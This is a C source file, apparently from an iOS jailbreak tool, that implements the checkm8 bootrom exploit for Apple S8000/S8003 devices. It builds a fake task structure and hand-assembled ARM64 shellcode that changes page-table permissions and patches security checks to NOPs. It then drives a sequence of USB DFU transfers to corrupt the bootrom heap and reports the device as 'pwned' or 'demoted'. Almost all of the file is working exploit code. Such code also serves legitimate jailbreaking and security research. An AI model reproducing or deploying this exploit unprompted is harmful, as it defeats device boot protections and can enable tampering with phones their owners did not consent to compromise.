
#include <iousb.h>
#include <common.h>
#include <checkm8_s8000.h>

static unsigned char blank[2048];
static unsigned char payload[2048];
static int payloadLen=2048;

static int make_payload(io_client_t client)
{
    // 0x7ff's eclipsa style
    // original: https://github.com/0x7ff/eclipsa
    
    dfu_overwrite_t overwrite;
    UInt32 *shc;
    
    memset(&overwrite, '\0', sizeof(overwrite));
    
    // create task
    overwrite.synopsys_task.id = 5;
    strcpy(overwrite.synopsys_task.name, "usb");
    overwrite.synopsys_task.magic_1 = TASK_MAGIC_1;
    overwrite.synopsys_task.stack_len = TASK_STACK_MIN;
    overwrite.synopsys_task.routine = SYNOPSYS_ROUTINE_ADDR;
    overwrite.synopsys_task.stack_base = IO_BUFFER_ADDR + offsetof(dfu_overwrite_t, fake_task);
    overwrite.synopsys_task.ret_waiters_list.prev = overwrite.synopsys_task.ret_waiters_list.next = overwrite.synopsys_task.stack_base + offsetof(dfu_task_t, queue_list);
    
    overwrite.heap_block.prev_sz = sizeof(overwrite.synopsys_task) / sizeof(overwrite.heap_block) + 1;
    overwrite.heap_block.this_sz = overwrite.synopsys_task.stack_len / sizeof(overwrite.heap_block) + 2;
    
    overwrite.fake_task.id = 6;
    overwrite.fake_task.irq_dis_cnt = 1;
    overwrite.fake_task.state = TASK_RUNNING;
    overwrite.fake_task.magic_1 = TASK_MAGIC_1;
    strcpy(overwrite.fake_task.name, "ipwnder");
    shc = overwrite.fake_task.arch.shc;
    
    // s8000 & s8003
    overwrite.fake_task.arg = VROM_PAGE_TABLE_ADDR;
    
    *shc++ = 0xd50343df; // msr     daifset, #0x3
    *shc++ = 0xd5033fdf; // isb
    
    *shc++ = 0xf940000a; // ldr     x10, [x0]
    *shc++ = 0xb24b054a; // orr     x10, x10, #0x60000000000000
    *shc++ = 0x9278f94a; // and     x10, x10, #0xffffffffffffff7f
    *shc++ = 0xf900000a; // str     x10, [x0]
    *shc++ = 0xd5033f9f; // dsb     sy
    *shc++ = 0xd50e871f; // tlbi
    *shc++ = 0xd5033f9f; // dsb     sy
    *shc++ = 0xd5033fdf; // isb
    
    *shc++ = 0x10000208; // adr     x8, INSN_NOP
    
    *shc++ = 0xb9400109; // ldr     w9, [x8]
    *shc++ = 0xb9000269; // str     w9, [x19]
    *shc++ = 0xb9000289; // str     w9, [x20]
    *shc++ = 0xb90002a9; // str     w9, [x21]
    *shc++ = 0xb90002c9; // str     w9, [x22]
    
    *shc++ = 0x9249f54a; // and     x10, x10, #0xff9fffffffffffff
    *shc++ = 0xb279014a; // orr     x10, x10, #0x80
    *shc++ = 0xf900000a; // str     x10, [x0]
    *shc++ = 0xd5033f9f; // dsb     sy
    *shc++ = 0xd50e871f; // tlbi
    *shc++ = 0xd5033f9f; // dsb     sy
    *shc++ = 0xd5033fdf; // isb
    
    *shc++ = 0xd50343ff; // msr     daifclr, #0x3
    *shc++ = 0xd5033fdf; // isb
    *shc++ = 0xd65f03c0; // ret
    
    *shc++ = 0xd503201f; // INSN_NOP
    
    overwrite.fake_task.arch.x[19] = PATCH_ADDR_0;
    overwrite.fake_task.arch.x[20] = PATCH_ADDR_1;
    overwrite.fake_task.arch.x[21] = PATCH_ADDR_2;
    overwrite.fake_task.arch.x[22] = PATCH_ADDR_3;
    overwrite.fake_task.magic_0 = TASK_STACK_MAGIC;
    overwrite.fake_task.arch.lr = ARCH_TASK_TRAMP_ADDR;
    overwrite.fake_task.stack_len = overwrite.synopsys_task.stack_len;
    overwrite.fake_task.stack_base = overwrite.synopsys_task.stack_base;
    overwrite.fake_task.arch.sp = overwrite.fake_task.stack_base + overwrite.fake_task.stack_len;
    overwrite.fake_task.routine = overwrite.fake_task.stack_base + offsetof(dfu_task_t, arch.shc);
    overwrite.fake_task.queue_list.prev = overwrite.fake_task.queue_list.next = IO_BUFFER_ADDR + offsetof(dfu_task_t, ret_waiters_list);
    overwrite.fake_task.ret_waiters_list.prev = overwrite.fake_task.ret_waiters_list.next = overwrite.fake_task.stack_base + offsetof(dfu_task_t, ret_waiters_list);
    
    payloadLen = sizeof(overwrite) - offsetof(dfu_overwrite_t, synopsys_task.callout);
    memcpy(payload, (const void*)&overwrite + offsetof(dfu_overwrite_t, synopsys_task.callout), payloadLen);
    
    return 0;
}

static void set_global_state(io_client_t client)
{
    transfer_t result;
    unsigned int val;
    UInt32 sent;
    
    memset(&blank, '\x41', 2048);
    
    val = 768;
    
    int i=0;
    while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, blank, 2048, 0)) != 0x40){
        i++;
        DEBUGLOG("[%s] (*) retry: %x", __FUNCTION__, i);
        usleep(10000);
        result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 64);
        DEBUGLOG("[%s] (*) %x", __FUNCTION__, result.ret);
        usleep(10000);
    }
    
    DEBUGLOG("[%s] (1/3) val: %x", __FUNCTION__, val);
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, blank, val, 100);
    DEBUGLOG("[%s] (2/3) %x", __FUNCTION__, result.ret);
    
    result = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
    DEBUGLOG("[%s] (3/3) %x", __FUNCTION__, result.ret);
}

static void heap_occupation(io_client_t client)
{
    transfer_t result;
    
    memset(&blank, '\0', 2048);
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, payload, payloadLen, 100);
    DEBUGLOG("[%s] (1/2) %x", __FUNCTION__, result.ret);
    result = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
    DEBUGLOG("[%s] (2/2) %x", __FUNCTION__, result.ret);
}

int checkm8_s8000(io_client_t client)
{
    IOReturn res;
    transfer_t result;
    
    if(make_payload(client) != 0) {
        ERROR("[%s] ERROR: Failed to generate payload!", __FUNCTION__);
        return -1;
    }
    
    memset(&blank, '\0', 2048);
    
    LOG_EXPLOIT_NAME("checkm8");
    
    result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 2048);
    usleep(1000);
    
    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
    res = io_reset(client);
    
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time_stage(&client, 5, DEVICE_DFU, false);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG_PROGRESS("[%s] running set_global_state()", __FUNCTION__);
    set_global_state(client);
    
    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
    io_close(client);
    client = NULL;
    usleep(10000);
    get_device_time_stage(&client, 5, DEVICE_DFU, false);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG_PROGRESS("[%s] running heap_occupation()", __FUNCTION__);
    heap_occupation(client);
    
    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
    io_close(client);
    client = NULL;
    usleep(100000);
    get_device_time_stage(&client, 5, DEVICE_DFU, true);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    if(client->hasSerialStr == false) {
        read_serial_number(client); // For iOS 10 and lower
    }
    
    if(client->hasSerialStr != true) {
        ERROR("[%s] Serial number was not found!", __FUNCTION__);
        return -1;
    }
    
    if(client->devinfo.hasPwnd == true) {
        if(!strcmp(client->devinfo.pwnstr, "demoted")) {
            LOG_DONE("[%s] demoted!", __FUNCTION__);
            return 0;
        }
        LOG_DONE("[%s] pwned!", __FUNCTION__);
        return 1;
    }
    
    
    return -1;
}
